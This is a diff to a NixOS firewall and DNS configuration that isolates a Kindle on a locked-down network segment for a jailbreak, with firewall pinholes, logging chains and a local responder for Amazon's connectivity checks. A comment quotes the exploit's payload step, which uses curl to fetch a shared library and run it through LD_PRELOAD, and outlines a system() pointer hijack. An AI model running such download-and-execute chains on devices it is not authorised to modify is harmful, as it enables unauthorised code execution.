@@ -54,11 +54,25 @@
 #   4. Only then connect the Kindle.
 #
 # ── After the jailbreak ───────────────────────────────────────────────────────
-# Repoint the Kindle's pinhole at gromit's own 192.168.1.65:443 and it lives
-# here permanently: Calibre-Web over OPDS and NOTHING else, no internet at all,
-# so it can never OTA again. That retires the risk outright rather than
-# maintaining a denylist against it — and gives the isolated untrusted-device
-# network that was wanted anyway.
+# ⚠️ CORRECTION (2026-11-01). Three PR descriptions said "repoint the Kindle's
+# pinhole at 192.168.1.65:443 and it lives here permanently". That would have
+# been SILENTLY DROPPED: rule 2 of this chain drops the whole segment →
+# 192.168.1.0/24, and 443 is not open on this interface either. Verified
+# against the live ruleset rather than re-read from the plan.
+#
+# What actually works, when that step comes:
+#   * add an ACCEPT for 192.168.50.10 → 192.168.1.65 tcp/443 placed BEFORE the
+#     house-LAN DROP (ordering is the whole trick). Everything else toward the
+#     house stays blocked.
+#   * add ebooks.rosemaryacres.com to the segment's blocky allowlist.
+# That keeps the existing hostname, the Let's Encrypt cert and the customDNS
+# split-horizon all working unchanged — no segment-local vhost, no second cert.
+#
+# Do NOT instead map ebooks.rosemaryacres.com to 192.168.50.1: that mapping is
+# global, so every house client would be handed an address it has no route to.
+#
+# The end state is still the same — Calibre-Web over OPDS and no internet at
+# all, so the device can never OTA again.
 #
 # ⚠️ COST: enp6s0u1 is the designated standby LAN NIC (networking.nix mirrors
 # enp3s0's rules onto it so a failed onboard port is a cable move). Using it
@@ -123,12 +137,68 @@ let
   # Every entry is scoped to a SOURCE address, so one device's permitted flow can
   # never become another's. Anything not listed is dropped and logged.
   pinholes = [
-    # sanctuary.skyvincent.com — one A record, identical from 1.1.1.1 / 9.9.9.9 /
-    # 8.8.8.8, no CNAME, TTL 1799: a single-homed host rather than a CDN, so
-    # pinning the address is sound. If it moves, the failure is "no internet",
-    # which is the safe direction; re-resolve and update here.
+    # ── THE KINDLE ──────────────────────────────────────────────────────────
+    # The chosen jailbreak is now SPIDERCAT, not Sanctuary (changed 2026-11-01).
+    # Sanctuary's server went dark — 78.24.205.144 answers :22 but neither :80
+    # nor :443, and the skyvincent.com apex has no A record at all. SpiderCat
+    # (released 01/09/26) covers firmware 5.16.3–5.19.5 against this PW4's
+    # 5.18.1, its host kindlemodding.org is up, its payload is an .azw3 that
+    # can be SIDELOADED OVER USB, and it blocks OTA updates itself once done.
+    # The payload is staged at /mnt/fusion/books/spidercat/ with its sha256, so
+    # the Kindle never needs to reach kindlemodding.org at all.
+    #
+    # ⚠️ SpiderCat still requires Wi-Fi for the duration — the payload is local
+    # but the exploit uses the network, and the documentation does not say what
+    # it contacts. So NO pinhole is written for it here: start closed, run it,
+    # and read `kindle-watch`. The drop log names the destination, exactly as it
+    # did for the AP. A blocked attempt is retryable; the OTA path stays shut
+    # the whole time by both the firewall default-DROP and the DNS allowlist.
+    #
+    # ⚠️ If what it reaches for turns out to be an AMAZON host, stop and think
+    # before opening it — that is the one direction this segment exists to keep
+    # closed, and the fill-the-storage trick (OTA needs ~90 MB free) becomes
+    # load-bearing rather than optional.
+    #
+    # Kept below as a FALLBACK only: the Sanctuary pinhole. Harmless while that
+    # host is dark, and ready if it returns.
     { src = kindleIP; dst = "78.24.205.144"; proto = "tcp"; port = 80;
-      what = "sanctuary.skyvincent.com — the jailbreak"; }
+      what = "sanctuary.skyvincent.com — FALLBACK, server down since 2026-11-01"; }
+
+    # ── What SpiderCat actually needs, read out of the payload ──────────────
+    # Not guessed. The .azw3 was unpacked on 2026-11-01 and the exploit's own
+    # code says exactly one external thing happens. After forging a libc
+    # pointer into system(), it injects a shell command through a fake
+    # XMLHttpRequest URL:
+    #
+    #   curl -o /tmp/jb.so 'https://kindlemodding.org/spidercat/jb.so'
+    #   chmod +x /tmp/jb.so
+    #   lipc-set-prop com.lab126.system updateWaveform 'LD_PRELOAD=/tmp/jb.so'
+    #
+    # That curl is the whole network requirement. Every other URL in the file
+    # is an XML namespace or the 127.0.0.1 injection vector. NO AMAZON HOST is
+    # involved, which is what makes this safe to open.
+    #
+    # kindlemodding.org is GitHub Pages: the four documented anycast addresses
+    # below, stable and not a rotating CDN. Resolved identically from 1.1.1.1,
+    # 9.9.9.9 and 8.8.8.8. Permitting them on 443 cannot reach anything else of
+    # consequence, because DNS on this segment is allowlist-only — no other
+    # GitHub Pages name resolves here.
+    #
+    # ⚠️ Why the device must ALSO believe it has internet (the block above):
+    # this curl runs on the Kindle, so it needs the radio up. On the first
+    # attempt the exploit ran fine and printed "executing", but the Kindle had
+    # already powered its Wi-Fi down over the failed connectivity check, so the
+    # fetch silently failed. "executing" is printed unconditionally inside a
+    # try/catch with no retry — it is the last line the script ever prints, so
+    # a stalled jailbreak looks exactly like a running one.
+    { src = kindleIP; dst = "185.199.108.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+    { src = kindleIP; dst = "185.199.109.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+    { src = kindleIP; dst = "185.199.110.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+    { src = kindleIP; dst = "185.199.111.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
 
     # ── AP → UniFi controller ────────────────────────────────────────────────
     # The observation pass on 2026-11-01 found the AP reaches its controller
@@ -148,6 +218,14 @@ let
       what = "unifi.broadlinc.com — inform/adoption"; }
     { src = apIP; dst = controllerIP; proto = "udp"; port = 5514;
       what = "same host — remote syslog (observed, 44 pkts)"; }
+
+    # STUN. Appeared only AFTER the controller became resolvable — it was not
+    # in the first observation pass at all, because the AP had nothing to STUN
+    # against yet. 9 packets dropped to the same host; everything else the AP
+    # sends is now accepted. Added because the log showed it, which is the
+    # whole point of the note above.
+    { src = apIP; dst = controllerIP; proto = "udp"; port = 3478;
+      what = "same host — STUN (observed after inform came up)"; }
 
     # NOT allowed, on purpose: {0,1,2,3}.ubnt.pool.ntp.org. Pool records rotate
     # across many addresses, so an IP pinhole for them would be fragile and
@@ -311,8 +389,52 @@ in
   # to it — no SSH, no 443, no Jellyfin.
   networking.firewall.interfaces.${iface} = {
     allowedUDPPorts = [ 53 67 ];
-    allowedTCPPorts = [ 53 ];
+    allowedTCPPorts = [ 53 80 ];
   };
+
+  # ── The Kindle's connectivity check, answered LOCALLY ───────────────────────
+  # On 2026-11-01 the Kindle associated, took its .10 reservation, made exactly
+  # four DNS lookups — all blocked — and then declared "can't connect to Wi-Fi"
+  # and powered its radio down. It never sent a single packet; DNS stopped it
+  # first. The lookups were its connectivity check:
+  #
+  #     spectrum.s3.amazonaws.com      dogvgb9ujhybx.cloudfront.net
+  #     kindle-wifi-cn.amazon.cn       dns.kindle.com
+  #
+  # SpiderCat needs Wi-Fi up for the duration, so a Kindle that decides the
+  # network is dead is a blocker.
+  #
+  # Answered here rather than by letting it reach Amazon. Those are the hosts
+  # this whole segment exists to keep it away from, and a CloudFront pinhole is
+  # especially unappealing — CloudFront addresses are shared, so permitting one
+  # distribution's IP permits anything else served from it.
+  #
+  # Verified on a live blocky 0.29 rather than assumed: customDNS BEATS the
+  # allowlist-only denylist, so these names resolve here while google.com still
+  # returns 0.0.0.0 and sanctuary.skyvincent.com still resolves normally. No
+  # allowlist entries are needed.
+  #
+  # ⚠️ customDNS is GLOBAL, not per-client — house clients get this answer too,
+  # and 192.168.50.1 is unroutable for them. Checked before doing it: no
+  # Amazon-OUI device appears in the house ARP table (30 entries). That is
+  # evidence, not proof — a powered-off Fire TV would not show up — so if an
+  # Amazon device starts misbehaving on the house LAN, look here first.
+  #
+  # ⚠️ Without the vhost below, nginx answers an unknown Host on :80 with a 301
+  # to https — which would send the check to a closed port behind a cert that
+  # could never match. Verified by hand before relying on it.
+  services.nginx.virtualHosts."kindle-connectivity-check" = {
+    serverName = "dns.kindle.com spectrum.s3.amazonaws.com dogvgb9ujhybx.cloudfront.net kindle-wifi-cn.amazon.cn";
+    listenAddresses = [ gateway ];   # segment side only; never shadows the house
+    locations."/".return = "200 'ok'";
+  };
+
+  # (tcp/80 for that responder is merged into the firewall block below — 443
+  # stays SHUT on purpose: if the Kindle wants TLS instead, the attempt shows
+  # up in the kindle-in log and we change approach rather than guess.)
+  # OLD-NOTE: tcp/80 so the check can actually land. 443 stays SHUT on purpose: if the
+  # Kindle wants TLS instead, the attempt shows up in the kindle-in log below
+  # and we will know to change approach rather than guess.
 
   # ── The default-deny forward policy ─────────────────────────────────────────
   # Deliberately a DEDICATED CHAIN jumped to from FORWARD, rather than changing
@@ -338,6 +460,20 @@ in
       -j LOG --log-prefix "kindle-fw-drop: " --log-level 6
     iptables -A kindle-fwd -j DROP  # everything else, both directions
 
+
+    # Traffic to gromit ITSELF is INPUT, not FORWARD, so kindle-fwd never sees
+    # it and the connectivity check would be invisible. nginx has access_log
+    # off globally and nixos-fw-log-refuse carries no LOG target, so there is
+    # no existing signal to borrow. This chain only LOGs and RETURNs — it
+    # changes no policy, it just makes the segment's traffic to gromit visible.
+    # It is how we will tell "the check landed on :80" from "it wanted :443".
+    iptables -N kindle-in 2>/dev/null || true
+    iptables -F kindle-in
+    iptables -A kindle-in -p tcp --syn -m limit --limit 20/min --limit-burst 40 \
+      -j LOG --log-prefix "kindle-in: " --log-level 6
+    iptables -A kindle-in -j RETURN
+    iptables -C INPUT -i ${iface} -j kindle-in 2>/dev/null || iptables -I INPUT 1 -i ${iface} -j kindle-in
+
     # Jump in from FORWARD for both directions, at the top, idempotently.
     iptables -C FORWARD -i ${iface} -j kindle-fwd 2>/dev/null || iptables -I FORWARD 1 -i ${iface} -j kindle-fwd
     iptables -C FORWARD -o ${iface} -j kindle-fwd 2>/dev/null || iptables -I FORWARD 2 -o ${iface} -j kindle-fwd
@@ -349,6 +485,9 @@ in
   '';
 
   networking.firewall.extraStopCommands = ''
+    iptables -D INPUT -i ${iface} -j kindle-in 2>/dev/null || true
+    iptables -F kindle-in 2>/dev/null || true
+    iptables -X kindle-in 2>/dev/null || true
     iptables -D FORWARD -i ${iface} -j kindle-fwd 2>/dev/null || true
     iptables -D FORWARD -o ${iface} -j kindle-fwd 2>/dev/null || true
     iptables -F kindle-fwd 2>/dev/null || true
